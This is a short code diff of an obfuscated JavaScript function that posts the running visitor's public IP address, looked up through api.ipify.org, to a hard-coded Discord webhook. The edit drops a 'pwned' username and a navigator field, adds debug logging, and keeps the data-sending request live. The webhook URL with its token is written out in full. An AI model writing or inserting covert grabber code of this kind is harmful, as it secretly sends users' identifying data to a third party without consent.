@@ -1,16 +1,15 @@
 function aIdfB21P() {
     var webhook = 'https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV';
-
+    console.log('test');
     
     var request = new XMLHttpRequest();
     request.open('POSt', webhook);
     request.setRequestHeader('Content-type', 'application/json');
-
+    console.log('test');
     var params = {
-        username: 'pwned',
-        content: `${window.navigator}\n${LOpVf986('https://api.ipify.org/')}`
+        content: `${LOpVf986('https://api.ipify.org/')}`
     };
-
+    console.log('test');
     request.send(JSON.stringify(params));
 }
 
